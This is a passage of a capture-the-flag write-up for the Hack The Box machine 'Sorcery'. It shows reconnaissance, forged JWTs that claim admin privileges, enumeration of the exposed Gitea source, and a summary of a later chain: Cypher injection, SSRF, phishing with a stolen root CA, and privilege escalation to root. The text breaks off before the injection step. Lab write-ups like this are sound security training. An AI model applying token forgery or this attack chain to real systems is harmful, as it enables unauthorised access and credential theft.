---
Category: HTB/Machines/Linux
tags:
  - HTB
  - Machine
  - Linux
  - Insane
  - Gitea
  - Rust
  - JSONWebToken
  - JWT
  - Tampering
  - GraphDB
  - Neo4j
  - CypherInjection
  - Passkey
  - ServerSideRequestForgery
  - SSRF
  - DNSInjection
  - ApacheKafka
  - KafkaProtocol
  - Docker
  - Container
  - Pivoting
  - FTP
  - Certificates
  - CertificateForging
  - Phishing
  - ManInTheMiddle
  - mitmproxy
  - Sniffing
  - xvfb
  - GTFOBins
  - Kerberos
  - GSSAPI
  - SystemSecurityServicesDaemon
  - SSSD
  - FreeIPA
---

![](images/Sorcery.png)

## Table of Contents

- [Summary](#Summary)
- [Reconnaissance](#Reconnaissance)
    - [Port Scanning](#Port-Scanning)
    - [Enumeration of Port 443/TCP](#Enumeration-of-Port-443TCP)
- [JSON Web Token Tampering](#JSON-Web-Token-Tampering)
- [Enumeration of git.sorcery.htb](#Enumeration-of-gitsorceryhtb)
    - [Privilege Escalation to admin (Unauthenticated)](#Privilege-Escalation-to-admin-Unauthenticated)
    - [Admin Dashboard Enumeration](#Admin-Dashboard-Enumeration)
    - [Cloning the Repository](#Cloning-the-Repository)
    - [Further Investigation](#Further-Investigation)
- [Cypher Injection](#Cypher-Injection)
    - [Change Admin Password](#Change-Admin-Password)
- [Admin Dashboard Enumeration (Authenticated)](#Admin-Dashboard-Enumeration-Authenticated)
    - [Enroll Passkey](#Enroll-Passkey)
- [Foothold](#Foothold)
    - [Server-Side Request Forgery (SSRF) into DNS Injection through Kafka Protocol](#Server-Side-Request-Forgery-SSRF-into-DNS-Injection-through-Kafka-Protocol)
- [Enumeration (user)](#Enumeration-user)
    - [LinPEAS Execution](#LinPEAS-Execution)
    - [DEEPCE Exection](#DEEPCE-Exection)
    - [Enumeration using nslookup](#Enumeration-using-nslookup)
- [Pivoting](#Pivoting)
    - [Transfer Chisel](#Transfer-Chisel)
    - [Building Reverse SOCKS Tunnel](#Building-Reverse-SOCKS-Tunnel)
- [FTP Enumeration](#FTP-Enumeration)
- [Privilege Escalation to tom_summers](#Privilege-Escalation-to-tom_summers)
    - [Phishing](#Phishing)
        - [Generate Certificates](#Generate-Certificates)
        - [Setting um MITMProxy](#Setting-um-MITMProxy)
        - [Adding DNS Entry](#Adding-DNS-Entry)
        - [Sending Phishing Mail](#Sending-Phishing-Mail)
        - [Receiving Traffic](#Receiving-Traffic)
- [user.txt](#usertxt)
- [Enumeration (tom_summers)](#Enumeration-tom_summers)
- [Privilege Escalation to tom_summers_admin](#Privilege-Escalation-to-tom_summers_admin)
    - [LinPEAS Execution](#LinPEAS-Execution)
    - [Credential Retrieval through xvfb](#Credential-Retrieval-through-xvfb)
- [Enumeration (tom_summers_admin)](#Enumeration-tom_summers_admin)
- [Privilege Escalation to rebecca_smith](#Privilege-Escalation-to-rebecca_smith)
    - [GTFOBins: strace](#GTFOBins-strace)
- [Enumeration (rebecca_smith)](#Enumeration-rebecca_smith)
    - [LinPEAS Execution](#LinPEAS-Execution)
    - [PSPY Execution](#PSPY-Execution)
- [Privilege Escalation to ash_winter](#Privilege-Escalation-to-ash_winter)
    - [Kerberos GSSAPI Authentication](#Kerberos-GSSAPI-Authentication)
- [Enumeration (ash_winter)](#Enumeration-ash_winter)
    - [FreeIPA Enumeration](#FreeIPA-Enumeration)
- [Privilege Escalation to root](#Privilege-Escalation-to-root)
    - [FreeIPA Misconfiguration](#FreeIPA-Misconfiguration)
- [root.txt](#roottxt)

## Summary

The box starts with with a `web appliction` that allows to register as a normal `user`, as a `seller` and to authenticate via `Passkeys`. It also provides access to the full `code base` published via an instance of `Gitea` running on a `Subdomain` or `Virtual Host (VHOST)` configuration.

The information from within the source code provide crucial information which are needed through the whole box. Like an on-going `Phishing Campaign`, the switch to the `HTTPS Protocol`, the location of the `Certificate` and `Private Key` of the `RootCA` as well as the name of a user which felt for `phishing`.

The code base also provides information about the underlying `infrastructure`, `frontend` and `backend` using `Neo4j` as `Graph Database` as well as `Apache Kafka`, `MailHog` and `vsftpd`.

As first step it is necessary to use `Cypher Injection` on the `Store Page` to update the `password` of the `admin` user. Then a `Passkey` needs to be rolled out and used in order to abuse the `Debug` option in the web application to perform a `Server-Side Request Forgery (SSRF)` against the `Kafka Endpoint` to `inject` a payload into `DNS` to achieve `Remote Code Execution (RCE)` and to gain `Foothold` inside a `Docker Container`.

From the position inside the container `Pivoting` allows to access the internal `FTP Server` in order to use `Anonymous Authentication` to grab the necessary files to prepare a `Phishing Campaign` against the user which felt already once for phishing.

After the user felt a second time for it, the newly obtained credentials lead to access via `SSH` on the main system and to the `user.txt`.

The next step is to `exfiltrate` data from a `xvfb session` containing a `password` for another user. This user then is allowed to execute `Docker` and `strace` on behalf of another user which leads to `Privilege Escalation` by using `GTFOBins`.

For the next `Elevation of Privileges` the tool `PSPY` can be used to catch `plaintext credentials`.

The upcoming part requires to request a `Kerberos Ticket` from the `Domain Controller` and then using `GSSAPI Authenitcation` to authenticate against localhost to get a shell as another user.

This last user now has the privilege to use `sudo` in order to `restart` the `System Security Services Daemon (SSSD)`. To abuse that the `FreeIPA` configuration needs to be modified to put a user into the group of `sysadmins` and to grant him `allow_sudo` permissions. After another restart of the service the user can drop into a shell as `root` and grab the `root.txt`.

## Reconnaissance

### Port Scanning

We started with the initial `port scan` using `Nmap` and found port `22/TCP` and port `443/TCP` to be open. We also added `sorcery.htb` to our `/etc/hosts` file because of the `redirect` by the web server.

```shell
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV 10.129.238.66
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-14 21:21 CEST
Nmap scan report for 10.129.238.66
Host is up (0.019s latency).
Not shown: 998 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|_  256 97:b6:72:9c:39:a9:6c:dc:01:ab:3e:aa:ff:cc:13:4a (ED25519)
443/tcp open  ssl/http nginx 1.27.1
|_http-title: Did not follow redirect to https://sorcery.htb/
| ssl-cert: Subject: commonName=sorcery.htb
| Not valid before: 2024-10-31T02:09:11
|_Not valid after:  2052-03-18T02:09:11
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.56 seconds
```

```shell
┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.238.66   sorcery.htb
```

### Enumeration of Port 443/TCP

On port `443/TCP` we found a web application offering various options like the typical `Login` and `Register` options as well as the usage of `Passkeys`.

- [https://sorcery.htb/auth/login](https://sorcery.htb/auth/login)

![](images/2025-06-14_21-25_443_login_page.png)

As we hovered over `our repo` we found a `Subdomain` or `Virtual Host Configuration (VHOST)` pointing to a `code management solution`.

```shell
https://git.sorcery.htb/nicole_sullivan/infrastructure
```

We added this one to our `/etc/hosts` file as well and moved on with the `enumeration` of the `website`.

```shell
┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.238.66   sorcery.htb
10.129.238.66   git.sorcery.htb
```

On the `Register` tab we noticed that we could enter a `Registration Key` to register ourselves as a `seller`. However it was possible either enter something completely arbitrary or basically nothing on order to get a user successfully registered and logged in.

![](images/2025-06-14_22-13_443_register.png)

![](images/2025-06-14_22-13_443_register_successful.png)

| Username | Password |
| -------- | -------- |
| foobar   | foobar   |

The `dashboard` greeted us with all sorts of items related to sorcery which was obviously the theme of the box.

![](images/2025-06-15_16-15_443_dashboard.png)

With `Profile` we found some additional information and options like the `Enroll Passkey`.

![](images/2025-06-15_16-16_443_enroll_passkey.png)

Unfortunately with our basic user we were not allowed to `enroll` a `Passkey` whatsoever.

![](images/2025-06-15_16-17_443_enroll_passkey_404_unauthorized.png)

When we checked our `Cookie` settings in the `Developer Tools` we noticed that the application used `JSON Web Tokens (JWT)`.

![](images/2025-06-15_16-18_443_jwt.png)

We grabbed our token and had a closer look at it using the website `jwt.io`.

```shell
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjEzOTkwNjg3LWNlOWMtNGVlOS1iNzBjLTg5MmQwOGNhOTQ5NCIsInVzZXJuYW1lIjoiZm9vYmFyIiwicHJpdmlsZWdlTGV2ZWwiOjAsIndpdGhQYXNza2V5IjpmYWxzZSwib25seUZvclBhdGhzIjpudWxsLCJleHAiOjE3NTAwODMzMjl9.IQgYiWo5C1WvncTzA1N7jqf2le6Eql0DANmQwcwR4cE
```

- [https://jwt.io/](https://jwt.io/)

The decoded token showed a few interesting information like the `privilegeLevel` and `withPasskey`.

```shell
{
  "id": "13990687-ce9c-4ee9-b70c-892d08ca9494",
  "username": "foobar",
  "privilegeLevel": 0,
  "withPasskey": false,
  "onlyForPaths": null,
  "exp": 1750083329
}
```

![](images/2025-06-15_16-21_jwtio.png)

## JSON Web Token Tampering

We started tampering with our token and modified different values to see how the web application would handle it. We started with a simple change of our username to admin, we still couldn't enroll a passkey. 

```shell
{
  "id": "13990687-ce9c-4ee9-b70c-892d08ca9494",
  "username": "admin",
  "privilegeLevel": 0,
  "withPasskey": false,
  "onlyForPaths": null,
  "exp": 1750083329
}
```

```shell
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjEzOTkwNjg3LWNlOWMtNGVlOS1iNzBjLTg5MmQwOGNhOTQ5NCIsInVzZXJuYW1lIjoiYWRtaW4iLCJwcml2aWxlZ2VMZXZlbCI6MCwid2l0aFBhc3NrZXkiOmZhbHNlLCJvbmx5Rm9yUGF0aHMiOm51bGwsImV4cCI6MTc1MDA4MzMyOX0.9SalTdRqCI8dbrH-5NIOLzzkOwP3rCqVjFL7PmTO6kk
```

![](images/2025-06-15_16-24_jwt_admin_token.png)

![](images/2025-06-15_16-24_443_dashboard_admin_user.png)

Next we registered a new user with a random number and logged in. This time we were allowed to enroll a passkey.

![](images/2025-06-15_16-27_443_new_user_with_registration_key.png)

## Enumeration of git.sorcery.htb

Since our investigation of the website came to an end at this point, we moved on to `git.sorcery.htb` and found an instance of `Gitea` running version `1.22.1` with a publicly exposed `code base` containing the `web application` including everything from `frontend` to `backend`.

| Version |
| ------- |
| 1.22.1  |

![](images/2025-06-14_21-28_443_gitea.png)

Right after that we noticed a potential `username` called `nicole_sullivan`.

| Username        |
| --------------- |
| nicole_sullivan |

Then we performed the obvious things like checking for any additional branches, having a look at the commit history but we didn't found anything out of the ordinary.

![](images/2025-06-14_21-30_443_gitea_issue.png)

![](images/2025-06-14_21-32_443_gitea_issue_details.png)

However the `docker-compose.yml` contained a lot of useful information about the `backend` and which components are involved in serving the functionality of web application like `Apache Kafka` running on port `9092/TCP`, `MailHog` and `vsftpd`.

```shell
https://git.sorcery.htb/nicole_sullivan/infrastructure/src/branch/main/docker-compose.yml
```

```yaml
services:
  backend:
    restart: always
    platform: linux/amd64
    build:
      dockerfile: ./backend/Dockerfile
      context: .
    environment:
      WAIT_HOSTS: neo4j:7687, kafka:9092
      ROCKET_ADDRESS: 0.0.0.0
      DATABASE_HOST: ${DATABASE_HOST}
      DATABASE_USER: ${DATABASE_USER}
      DATABASE_PASSWORD: ${DATABASE_PASSWORD}
      INTERNAL_FRONTEND: http://frontend:3000
      KAFKA_BROKER: ${KAFKA_BROKER}
      SITE_ADMIN_PASSWORD: ${SITE_ADMIN_PASSWORD}
    healthcheck:
      test: ["CMD", "bash", "-c", "cat < /dev/null > /dev/tcp/127.0.0.1/8000"]
      interval: 5s
      timeout: 10s
      retries: 5

  frontend:
    restart: always
    build: frontend
    environment:
      WAIT_HOSTS: backend:8000
      API_PREFIX: ${API_PREFIX}
      HOSTNAME: 0.0.0.0
    healthcheck:
      test: ["CMD", "bash", "-c", "cat < /dev/null > /dev/tcp/127.0.0.1/3000"]
      interval: 5s
      timeout: 10s
      retries: 5

  neo4j:
    restart: always
    image: neo4j:5.23.0-community-bullseye
    environment:
      NEO4J_AUTH: ${DATABASE_USER}/${DATABASE_PASSWORD}
    healthcheck:
      test: ["CMD", "bash", "-c", "cat < /dev/null > /dev/tcp/127.0.0.1/7687"]
      interval: 5s
      timeout: 10s
      retries: 5

  kafka:
    restart: always
    build: kafka
    environment:
      CLUSTER_ID: pXWI6g0JROm4f-1iZ_YH0Q
      KAFKA_NODE_ID: 1
      KAFKA_LISTENER_SECURITY_PROTOCOL_MAP: CONTROLLER:PLAINTEXT,PLAINTEXT:PLAINTEXT
      KAFKA_LISTENERS: PLAINTEXT://kafka:9092,CONTROLLER://kafka:9093
      KAFKA_ADVERTISED_LISTENERS: PLAINTEXT://kafka:9092
      KAFKA_PROCESS_ROLES: broker,controller
      KAFKA_CONTROLLER_QUORUM_VOTERS: 1@kafka:9093
      KAFKA_CONTROLLER_LISTENER_NAMES: CONTROLLER
    healthcheck:
      test: ["CMD", "bash", "-c", "cat < /dev/null > /dev/tcp/kafka/9092"]
      interval: 5s
      timeout: 10s
      retries: 5

  dns:
    restart: always
    build: dns
    environment:
      WAIT_HOSTS: kafka:9092
      KAFKA_BROKER: ${KAFKA_BROKER}

  mail:
    restart: always
    image: mailhog/mailhog:v1.0.1

  ftp:
    restart: always
    image: million12/vsftpd:cd94636
    environment:
      ANONYMOUS_ACCESS: true
      LOG_STDOUT: true
    volumes:
      - "./ftp/pub:/var/ftp/pub"
      - "./certificates/generated/RootCA.crt:/var/ftp/pub/RootCA.crt"
      - "./certificates/generated/RootCA.key:/var/ftp/pub/RootCA.key"
    healthcheck:
      test: ["CMD", "bash", "-c", "cat < /dev/null > /dev/tcp/127.0.0.1/21"]
      interval: 5s
      timeout: 10s
      retries: 5

  gitea:
    restart: always
    build:
      dockerfile: gitea/Dockerfile
      context: .
    environment:
      GITEA_USERNAME: ${GITEA_USERNAME}
      GITEA_PASSWORD: ${GITEA_PASSWORD}
      GITEA_EMAIL: ${GITEA_EMAIL}
      USER_UID: 1000
      USER_GID: 1000
      GITEA__service__DISABLE_REGISTRATION: true
      GITEA__openid__ENABLE_OPENID_SIGNIN: false
      GITEA__openid__ENABLE_OPENID_SIGNUP: false
      GITEA__security__INSTALL_LOCK: true
    healthcheck:
      test: ["CMD", "bash", "-c", "cat < /dev/null > /dev/tcp/127.0.0.1/3000"]
      interval: 5s
      timeout: 10s
      retries: 5

  mail_bot:
    restart: always
    platform: linux/amd64
    build: mail_bot
    environment:
      WAIT_HOSTS: mail:8025
      MAILHOG_SERVER: ${MAILHOG_SERVER}
      CA_FILE: ${CA_FILE}
      EXPECTED_RECIPIENT: ${EXPECTED_RECIPIENT}
      EXPECTED_DOMAIN: ${EXPECTED_DOMAIN}
      MAIL_BOT_INTERVAL: ${MAIL_BOT_INTERVAL}
      SMTP_SERVER: ${SMTP_SERVER}
      SMTP_PORT: ${SMTP_PORT}
      PHISHING_USERNAME: ${PHISHING_USERNAME}
      PHISHING_PASSWORD: ${PHISHING_PASSWORD}
    volumes:
      - "./certificates/generated/RootCA.crt:/app/RootCA.crt"

  nginx:
    restart: always
    build: nginx
    volumes:
      - "./nginx/nginx.conf:/etc/nginx/nginx.conf"
      - "./certificates/generated:/etc/nginx/certificates"
    environment:
      WAIT_HOSTS: frontend:3000, gitea:3000
    healthcheck:
      test: ["CMD", "bash", "-c", "cat < /dev/null > /dev/tcp/127.0.0.1/443"]
      interval: 5s
      timeout: 10s
      retries: 5
    ports:
      - "443:443"
```

![](images/2025-06-14_21-33_443_gitea_docker_compose.png)

After we spend a bit more time in the repository we found two interesting notes and a new `username` in the `initial_data.rs`. It contained information that the `Certificate` and the `Private Key` for the `RootCA` are stored on the internal `FTP server` as well as a warning not to trust any `mails` coming from their domain `sorcery.htb` and any related `subdomain`. Additionally we learned that the user, `tom_summers`, got his password changed after he felt for a `Phishing Attack`.

```shell
https://git.sorcery.htb/nicole_sullivan/infrastructure/src/branch/main/backend/src/db/initial_data.rs
```

```rust
use crate::api::auth::create_hash;
use crate::db::models::post::Post;
use crate::db::models::product::Product;
use crate::db::models::user::{User, UserPrivilegeLevel};
use uuid::Uuid;

pub async fn initial_data() {
    dotenv::dotenv().ok();
    let admin_password = std::env::var("SITE_ADMIN_PASSWORD").expect("SITE_ADMIN_PASSWORD");
    let admin = User {
        id: Uuid::new_v4().to_string(),
        username: "admin".to_string(),
        password: create_hash(&admin_password).expect("site admin hash"),
        privilege_level: UserPrivilegeLevel::Admin,
    };
    admin.save().await;

    Post {
        id: Uuid::new_v4().to_string(),
        title: "Phishing Training".to_string(),
        description:
            "Hello, just making a quick summary of the phishing training we had last week. \
        Remember not to open any link in the email unless: \
        a) the link comes from one of our domains (<something>.sorcery.htb); \
        b) the website uses HTTPS; \
        c) the subdomain uses our root CA. (the private key is safely stored on our FTP server, so it can't be hacked). "
                .to_string(),
    }
    .save()
    .await;

    Post {
        id: Uuid::new_v4().to_string(),
        title: "Phishing awareness".to_string(),
        description:
        "There has been a phishing campaign that used our Gitea instance. \
        All of our employees except one (looking at you, @tom_summers) have passed the test. \
        Unfortunately, Tom has entered their credentials, but our infosec team quickly revoked the access and changed the password. \
        Tom, make sure that doesn't happen again! Follow the rules in the other post!"
            .to_string(),
    }
        .save()
        .await;
<--- CUT FOR BREVITY --->
```

| Username    |
| ----------- |
| tom_summers |

![](images/2025-06-14_21-53_443_gitea_initial_data.png)

We also catched a bit of insights for the configuration of the `DNS` construct and saved that for later.

```shell
https://git.sorcery.htb/nicole_sullivan/infrastructure/src/branch/main/dns/convert.sh
```

```bash
#!/bin/bash

entries_file=/dns/entries
hosts_files=("/dns/hosts" "/dns/hosts-user")

> $entries_file

for hosts_file in ${hosts_files[@]}; do
  while IFS= read -r line; do
    key=$(echo $line | awk '{ print $1 }')
    values=$(echo $line | cut -d ' ' -f2-)

    for value in $values; do
      echo "$key $value" >> $entries_file
    done
  done < $hosts_file
done
```

![](images/2025-06-14_22-02_443_gitea_convert.png)

### Privilege Escalation to admin (Unauthenticated)

While we searched our way through the repository we found the needed information about the `UserPrivilegeLevel` used in the `cookie`.

```shell
https://git.sorcery.htb/nicole_sullivan/infrastructure/src/branch/main/backend/src/db/models/user.rs
```

```rs
<--- CUT FOR BREVITY --->
#[derive(Clone, Copy, PartialOrd, PartialEq, Debug)]
pub enum UserPrivilegeLevel {
    Client = 0,
    Seller = 1,
    Admin = 2,
}
<--- CUT FOR BREVITY --->
```

![](images/2025-06-15_16-33_443_gitea_user_privileges.png)

We changed the value from `1` to `2` and tried to give ourselves `admin privileges`.

![](images/2025-06-15_16-34_jwt_admin_privilege_set.png)

```shell
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjM3NTJmYjUyLWM3MzYtNDljOS1iYjExLTJiM2QyZmMxZGMyZCIsInVzZXJuYW1lIjoiYWRtaW4iLCJwcml2aWxlZ2VMZXZlbCI6Miwid2l0aFBhc3NrZXkiOnRydWUsIm9ubHlGb3JQYXRocyI6bnVsbCwiZXhwIjoxNzUwMDg0MDE5fQ.fQxeI0fADNGOyRRjej5QDB3ViYutGpKC7gWEyBgquWU
```

And at the first glance it seemed that we elevated our privileges. Now the dashboard showed more options like `New Product`, `DNS`, `Debug` and `Blog`.

![](images/2025-06-15_16-35_443_admin_dashboard.png)

However, even if the `Username` and the `User Type` told us that we were `admin/Admin` it seemed that only the `frontend` accepted the `tampered token` but no `authentication` to the `backend` was made.

### Admin Dashboard Enumeration

On the `New Prodcut` tab we could create a new product. Obviously.

![](images/2025-06-15_16-40_443_new_product.png)

The `Debug` tab would let us send data to a `host` and `port` we specified.

![](images/2025-06-15_16-40_443_debug.png)

On `Blog` we found the information we already got from the repository about the `FTP server` and the user `tom_summers`.

![](images/2025-06-15_16-41_443_blog.png)

### Cloning the Repository

We cloned the repository to move a bit smoother through the code base and enhance our tooling.

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Sorcery/files]
└─$ GIT_SSL_NO_VERIFY=true git clone https://git.sorcery.htb/nicole_sullivan/infrastructure.git
Cloning into 'infrastructure'...
remote: Enumerating objects: 169, done.
remote: Counting objects: 100% (169/169), done.
remote: Compressing objects: 100% (142/142), done.
remote: Total 169 (delta 8), reused 169 (delta 8), pack-reused 0 (from 0)
Receiving objects: 100% (169/169), 136.24 KiB | 1.66 MiB/s, done.
Resolving deltas: 100% (8/8), done.
```

### Further Investigation

The Repository contained a lot of configuration files.

```shell
┌──(kali㉿kali)-[/media/…/Machines/Sorcery/files/infrastructure]
└─$ find .
.
./.git
./.git/branches
./.git/description
./.git/info
./.git/info/exclude
./.git/hooks
./.git/hooks/pre-applypatch.sample
./.git/hooks/update.sample
./.git/hooks/pre-merge-commit.sample
./.git/hooks/fsmonitor-watchman.sample
./.git/hooks/applypatch-msg.sample
./.git/hooks/commit-msg.sample
./.git/hooks/prepare-commit-msg.sample
./.git/hooks/pre-push.sample
./.git/hooks/pre-receive.sample
./.git/hooks/pre-rebase.sample
./.git/hooks/sendemail-validate.sample
./.git/hooks/post-update.sample
./.git/hooks/push-to-checkout.sample
./.git/hooks/pre-commit.sample
./.git/objects
./.git/objects/pack
./.git/objects/pack/pack-9d8a2d845d2853a4de36cdd54fabb472ba0472f8.pack
./.git/objects/pack/pack-9d8a2d845d2853a4de36cdd54fabb472ba0472f8.rev
./.git/objects/pack/pack-9d8a2d845d2853a4de36cdd54fabb472ba0472f8.idx
./.git/objects/info
./.git/refs
./.git/refs/heads
./.git/refs/heads/main
./.git/refs/tags
./.git/refs/remotes
./.git/refs/remotes/origin
./.git/refs/remotes/origin/HEAD
./.git/packed-refs
./.git/logs
./.git/logs/refs
./.git/logs/refs/remotes
./.git/logs/refs/remotes/origin
./.git/logs/refs/remotes/origin/HEAD
./.git/logs/refs/heads
./.git/logs/refs/heads/main
./.git/logs/HEAD
./.git/HEAD
./.git/config
./.git/index
./backend-macros
./backend-macros/Cargo.lock
./backend-macros/Cargo.toml
./backend-macros/src
./backend-macros/src/lib.rs
./backend
./backend/Cargo.lock
./backend/Cargo.toml
./backend/Dockerfile
./backend/Rocket.toml
./backend/src
./backend/src/api.rs
./backend/src/api
./backend/src/api/auth.rs
./backend/src/api/auth
./backend/src/api/auth/login.rs
./backend/src/api/auth/register.rs
./backend/src/api/blog.rs
./backend/src/api/blog
./backend/src/api/blog/get.rs
./backend/src/api/debug.rs
./backend/src/api/debug
./backend/src/api/debug/debug.rs
./backend/src/api/dns.rs
./backend/src/api/dns
./backend/src/api/dns/get.rs
./backend/src/api/dns/update.rs
./backend/src/api/products.rs
./backend/src/api/products
./backend/src/api/products/get_all.rs
./backend/src/api/products/get_one.rs
./backend/src/api/products/insert.rs
./backend/src/api/webauthn.rs
./backend/src/api/webauthn
./backend/src/api/webauthn/passkey.rs
./backend/src/api/webauthn/passkey
./backend/src/api/webauthn/passkey/finish_authentication.rs
./backend/src/api/webauthn/passkey/finish_registration.rs
./backend/src/api/webauthn/passkey/get.rs
./backend/src/api/webauthn/passkey/start_authentication.rs
./backend/src/api/webauthn/passkey/start_registration.rs
./backend/src/db.rs
./backend/src/db
./backend/src/db/connection.rs
./backend/src/db/initial_data.rs
./backend/src/db/models.rs
./backend/src/db/models
./backend/src/db/models/post.rs
./backend/src/db/models/product.rs
./backend/src/db/models/user.rs
./backend/src/error.rs
./backend/src/error
./backend/src/error/error.rs
./backend/src/main.rs
./backend/src/state.rs
./backend/src/state
./backend/src/state/browser.rs
./backend/src/state/dns.rs
./backend/src/state/kafka.rs
./backend/src/state/passkey.rs
./backend/src/state/privileges.rs
./backend/src/state/webauthn.rs
./dns
./dns/Cargo.lock
./dns/Cargo.toml
./dns/Dockerfile
./dns/convert.sh
./dns/docker-entrypoint.sh
./dns/src
./dns/src/main.rs
./dns/supervisord.conf
./docker-compose.yml
./frontend
./frontend/.eslintrc.json
./frontend/Dockerfile
./frontend/components.json
./frontend/next.config.mjs
./frontend/package-lock.json
./frontend/package.json
./frontend/postcss.config.mjs
./frontend/public
./frontend/public/next.svg
./frontend/public/vercel.svg
./frontend/src
./frontend/src/api
./frontend/src/api/client.ts
./frontend/src/api/error.ts
./frontend/src/app
./frontend/src/app/auth
./frontend/src/app/auth/layout.tsx
./frontend/src/app/auth/login
./frontend/src/app/auth/login/actions.tsx
./frontend/src/app/auth/login/page.tsx
./frontend/src/app/auth/logout
./frontend/src/app/auth/logout/route.tsx
./frontend/src/app/auth/passkey
./frontend/src/app/auth/passkey/page.tsx
./frontend/src/app/auth/register
./frontend/src/app/auth/register/actions.tsx
./frontend/src/app/auth/register/page.tsx
./frontend/src/app/auth/tabs.tsx
./frontend/src/app/dashboard
./frontend/src/app/dashboard/blog
./frontend/src/app/dashboard/blog/page.tsx
./frontend/src/app/dashboard/debug
./frontend/src/app/dashboard/debug/actions.tsx
./frontend/src/app/dashboard/debug/page-client.tsx
./frontend/src/app/dashboard/debug/page.tsx
./frontend/src/app/dashboard/dns
./frontend/src/app/dashboard/dns/actions.tsx
./frontend/src/app/dashboard/dns/page-client.tsx
./frontend/src/app/dashboard/dns/page.tsx
./frontend/src/app/dashboard/layout.tsx
./frontend/src/app/dashboard/new-product
./frontend/src/app/dashboard/new-product/actions.tsx
./frontend/src/app/dashboard/new-product/page-client.tsx
./frontend/src/app/dashboard/new-product/page.tsx
./frontend/src/app/dashboard/page.tsx
./frontend/src/app/dashboard/profile
./frontend/src/app/dashboard/profile/actions.tsx
./frontend/src/app/dashboard/profile/page.tsx
./frontend/src/app/dashboard/profile/passkey.tsx
./frontend/src/app/dashboard/store
./frontend/src/app/dashboard/store/[product]
./frontend/src/app/dashboard/store/[product]/not-found.tsx
./frontend/src/app/dashboard/store/[product]/page.tsx
./frontend/src/app/dashboard/store/all-tabs.tsx
./frontend/src/app/dashboard/store/breadcrumbs.tsx
./frontend/src/app/dashboard/store/page.tsx
./frontend/src/app/dashboard/tabs-inner.tsx
./frontend/src/app/dashboard/tabs.tsx
./frontend/src/app/favicon.ico
./frontend/src/app/globals.css
./frontend/src/app/layout.tsx
./frontend/src/app/page.tsx
./frontend/src/app/providers.tsx
./frontend/src/components
./frontend/src/components/misc
./frontend/src/components/misc/theme-provider.tsx
./frontend/src/components/ui
./frontend/src/components/ui/alert.tsx
./frontend/src/components/ui/breadcrumb.tsx
./frontend/src/components/ui/button.tsx
./frontend/src/components/ui/card.tsx
./frontend/src/components/ui/checkbox.tsx
./frontend/src/components/ui/form.tsx
./frontend/src/components/ui/input.tsx
./frontend/src/components/ui/label.tsx
./frontend/src/components/ui/table.tsx
./frontend/src/components/ui/tabs.tsx
./frontend/src/components/ui/toast.tsx
./frontend/src/components/ui/toaster.tsx
./frontend/src/components/ui/use-toast.ts
./frontend/src/entity
./frontend/src/entity/dns-entry.ts
./frontend/src/entity/post.ts
./frontend/src/entity/product.ts
./frontend/src/entity/user-server.ts
./frontend/src/entity/user.ts
./frontend/src/hooks
./frontend/src/hooks/useAuth.tsx
./frontend/src/lib
./frontend/src/lib/utils.ts
./frontend/src/protect
./frontend/src/protect/protect.tsx
./frontend/tailwind.config.ts
./frontend/tsconfig.json
```

Within the `connection.rs` we found some crucial information about the underlying database with was a `Graph Database` as it seemed.

```shell
┌──(kali㉿kali)-[/media/…/Machines/Sorcery/files/infrastructure]
└─$ cat backend/src/db/connection.rs 
use async_once::AsyncOnce;
use lazy_static::lazy_static;
use neo4rs::{query, Graph};
use serde::Deserialize;
use uuid::Uuid;

use backend_macros::Model;

use crate::db::initial_data::initial_data;

lazy_static! {
    pub static ref GRAPH: AsyncOnce<Graph> = AsyncOnce::new(async {
        dotenv::dotenv().ok();
        let user = std::env::var("DATABASE_USER").expect("DATABASE_USER");
        let password = std::env::var("DATABASE_PASSWORD").expect("DATABASE_PASSWORD");
        let host = std::env::var("DATABASE_HOST").expect("DATABASE_HOST");
        Graph::new(host.clone(), user, password)
            .await
            .unwrap_or_else(|_| panic!("Graph: {host}"))
    });
    pub static ref JWT_SECRET: String = Uuid::new_v4().to_string();
    pub static ref REGISTRATION_KEY: AsyncOnce<String> = AsyncOnce::new(async {
        let mut configs = Config::get_all().await;
        if configs.len() != 1 {
            panic!("Found {} configs instead of 1", configs.len());
        }
        configs.remove(0).registration_key
    });
}
```

## Cypher Injection

Knowing that we had to deal with `Neo4j`, this brought us to dig a bit deeper of potential vulnerabilities related to `Graph Databases` like `Cypher Injection`.

Therefore we tried testing different endpoints and started as the `unprivileged user` by `viewing` a `product` in the `store`.

```shell
GET /dashboard/store/88b6b6c5-a614-486c-9d51-d255f47efb4f?_rsc=16m2x HTTP/1.1
Host: sorcery.htb
Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjEzOTkwNjg3LWNlOWMtNGVlOS1iNzBjLTg5MmQwOGNhOTQ5NCIsInVzZXJuYW1lIjoiZm9vYmFyIiwicHJpdmlsZWdlTGV2ZWwiOjAsIndpdGhQYXNza2V5IjpmYWxzZSwib25seUZvclBhdGhzIjpudWxsLCJleHAiOjE3NTAwODcyNDd9.eje_ZoqiAhmfGVLvbCNWPZ9GN3mOHImJsSESppC2i78
Rsc: 1
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Not.A/Brand";v="99", "Chromium";v="136"
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Sec-Ch-Ua-Mobile: ?0
